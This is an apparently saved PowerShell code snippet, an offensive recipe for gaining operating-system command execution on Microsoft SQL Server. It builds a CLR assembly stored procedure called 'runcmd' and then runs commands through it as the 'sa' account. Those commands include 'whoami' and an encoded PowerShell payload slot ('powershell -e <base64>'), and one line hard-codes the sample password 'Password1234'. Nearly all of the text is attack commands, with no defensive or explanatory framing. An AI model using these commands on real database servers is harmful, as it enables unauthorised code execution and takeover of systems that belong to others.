---
id: bfd6d56c-122c-4272-b9f6-978a981e8345
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:20.364290+00:00'
updated_at: '2023-04-10T20:36:39.602305+00:00'
---

# Code Snippet bfd6d56c

**Language**: ps1

```ps1
# Create C# code for the DLL, the DLL and SQL query with DLL as hexadecimal string
Create-SQLFileCLRDll -ProcedureName "runcmd" -OutFile runcmd -OutDir C:\Users\user\Desktop

# Execute command using CLR assembly
Invoke-SQLOSCmdCLR -Username sa -Password <password> -Instance <instance> -Command "whoami" -Verbose
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "whoami" Verbose
Invoke-SQLOSCmdCLR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "powershell -e <base64>" -Verbose

# List all the stored procedures added using CLR
Get-SQLStoredProcedureCLR -Instance <instance> -Verbose
```


